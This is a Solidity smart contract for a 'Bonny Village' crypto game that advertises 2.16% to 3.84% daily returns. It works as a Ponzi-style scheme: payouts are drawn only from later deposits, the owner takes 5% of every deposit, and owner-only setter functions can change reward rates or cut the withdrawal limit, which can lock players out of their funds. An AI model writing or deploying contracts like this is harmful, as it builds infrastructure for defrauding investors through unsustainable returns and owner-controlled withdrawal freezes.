// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This is Official Smart Contract of Bonny Village Project.
// ROI From 2,16% Per Day, Up To 3,84% Per Day. 

// Web Site              https://bonny-village.fun/
// Telegramm             https://t.me/bonnygamesfan
// Discord               https://discord.gg/Mmq5KJRMzm


interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BonnyVillage { 

    ERC20 public constant token = ERC20(0x3806059fE247A988E5cf6A5Ddb8995B5569A1ff7); //BT testtokens ЗАМЕНА
    address immutable owner; 

    constructor (address _adr) { 
        totalProjectTime = block.timestamp;  
        owner = _adr;
        RewardIndex = 10;
        WithdrawIndex = 10;
        RepairIndex = 24;
    }

    //Important Index 
    uint public RewardIndex;
    uint public WithdrawIndex;
    uint public RepairIndex;

    //Total Project Infoirmation 
    uint public totalInvested; // всего заинвестировано 
    uint public totalPlayers; // всего играет 
    uint public totalBuildings; // всего строений
    uint public totalEarnings; // всего заработано игроками 
    uint public totalProjectTime; // всего длится проект 

    //Total Player Information
    mapping ( address => Player ) public players;

    struct Player { 
        //
        uint invested; // сколько всего проинвестировано в проект игроком
        uint alreadyClaimed; //сколько всего было снять

        uint profitPerHour; // профит за час 
        uint pendingFunds; // сколько должно быть выплачено 
        uint referrals; // сколько всего рефералок 
        uint referralEarnings;  // от рефералок получено 
        uint numberOfWithdrawals; //кол во снятий 

        address partner; // партнёр от которого я получил
        uint binary; //бинарное число 
        uint timestamp; // метка времени для игрока для repair
    }

    function buildHouse ( address partner, uint8 index, bool reinvest, uint binary) external {    
        require(index < 15 && index !=0 , "indexError!!");
        repair();

        uint price;
        uint profit; 

        if (index == 1) { 
            price = 3;
            profit = 27 * RewardIndex;
        } else if (index == 2) {
            price = 10;
            profit = 95 * RewardIndex;
        } else if (index == 3) {
            price = 25;
            profit = 247 * RewardIndex;
        } else if (index == 4) {
            price = 50;
            profit = 500 * RewardIndex;
        } else if (index == 5) {
            price = 75;
            profit = 787 * RewardIndex;
        } else if (index == 6) {
            price = 100;
            profit = 1100 * RewardIndex;
        } else if (index == 7) {
            price = 150;
            profit = 1725 * RewardIndex;
        } else if (index == 8) {
            price = 250;
            profit = 3000 * RewardIndex;
        } else if (index == 9) {
            price = 500;
            profit = 6250 * RewardIndex ;
        } else if (index == 10) {
            price = 750;
            profit = 9750 * RewardIndex;
        } else if (index == 11) {
            price = 1000;
            profit = 13500 * RewardIndex;
        } else if (index == 12) {
            price = 2500;
            profit = 35000 * RewardIndex;
        } else if (index == 13) {
            price = 5000;
            profit = 75000 * RewardIndex;
        } else if (index == 14) {
            price = 7500;
            profit = 120000 * RewardIndex;
        } 

        price *= 1e18;
        profit *= 1e13;

        if (players[msg.sender].partner == address(0)) {
            bool isPartner = msg.sender != partner && players[partner].profitPerHour > 0;
            players[msg.sender].partner = isPartner ? partner : owner;
            players[isPartner ? partner : owner].referrals += 1;
        }

        if ( reinvest ) {
            uint256 pendingFunds = players[msg.sender].pendingFunds;
            if (pendingFunds >= price) {
                players[msg.sender].pendingFunds -= price;
            } else {
                players[msg.sender].pendingFunds = 0; // ??? 
                token.transferFrom(msg.sender, address(this), price - pendingFunds); // ???
            }
        } else {
            token.transferFrom(msg.sender, address(this), price);
        }

        address p = players[msg.sender].partner;
        players[p].pendingFunds += (price * 5) / 100; //+5% from deposit 
        players[p].referralEarnings += (price * 5) / 100;
        players[owner].pendingFunds += (price * 5) / 100; //+5% from deposit 

        players[msg.sender].profitPerHour += profit;
        players[msg.sender].binary = binary;

        players[msg.sender].invested += price;
        totalInvested += price;
        totalBuildings += 1;
    }


     function withdraw() public {
        require(tx.origin == msg.sender, "tx.origin errore");
        uint256 w = players[msg.sender].numberOfWithdrawals;
        require(w < WithdrawIndex, "limit");

        players[msg.sender].numberOfWithdrawals = w + 1;

        repair();

        uint256 amount = players[msg.sender].pendingFunds;

        uint256 contractBalance = token.balanceOf(address(this));
        
        if (amount > contractBalance) {
            amount = contractBalance;
        }

        players[msg.sender].pendingFunds -= amount;
        totalEarnings+=amount;
        players[msg.sender].alreadyClaimed += amount;
        token.transfer(msg.sender, amount);

    }

     function repair() public {
        uint256 t = players[msg.sender].timestamp;
        if (t == 0) {
            totalPlayers += 1;
            players[msg.sender].timestamp = block.timestamp;
            return;
        }
        
        uint256 h = block.timestamp / 3600 - t / 3600;
        if (h == 0) return;
        if (h > RepairIndex) h = RepairIndex;

        players[msg.sender].pendingFunds += players[msg.sender].profitPerHour * h;
        players[msg.sender].timestamp = block.timestamp;
    }

    function gettotalProjectTime() external view returns ( uint ) { 
        return block.timestamp - totalProjectTime;
    }

    function getPlayerTimeStamp() external view returns ( uint ) { 
        return block.timestamp - players[msg.sender].timestamp;
    }


    //Ofunc
    function setRewardIndex ( uint amount ) external { 
        require(msg.sender == owner , "ownerReject");
        RewardIndex = amount;
    }

    function setWithdrawIndex ( uint amount ) external { 
        require(msg.sender == owner , "ownerReject");
        WithdrawIndex = amount;
    }


    function setRepairIndex ( uint amount ) external { 
        require(msg.sender == owner , "ownerReject");
        RepairIndex = amount;
    }

}



